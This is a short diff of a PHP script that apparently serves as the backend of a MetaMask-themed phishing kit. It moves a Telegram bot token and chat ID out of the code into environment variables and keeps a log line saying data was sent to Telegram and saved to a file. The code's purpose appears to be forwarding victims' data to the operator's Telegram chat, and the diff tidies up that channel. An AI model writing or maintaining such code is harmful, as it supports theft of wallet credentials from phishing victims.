@@ -4,8 +4,10 @@
 $Your_Mail = "metamask@constructvine.store";
 
 /* Telegram Bot Configuration */
-$botToken = "7558491921:AAHUTukOw29luISZHlTCiEUrPaqcQEwjrAg";
-$chatId = "7296145278";
+
+// Access bot token and chat ID from environment variables
+$botToken = getenv('BOT_TOKEN');  // Accessing the bot token from the environment variable
+$chatId = getenv('CHAT_ID');      // Accessing the chat ID from the environment variable
 
 // Ensure bot is enabled
 if ($botToken_0 == "on" && $chatId_0 == "on") {
@@ -45,4 +47,5 @@ if ($botToken_0 == "on" && $chatId_0 == "on") {
 $f = fopen("../../a.php", "a");
 fwrite($f, "Data sent to Telegram and saved to a file.");
 fclose($f);
+
 ?>
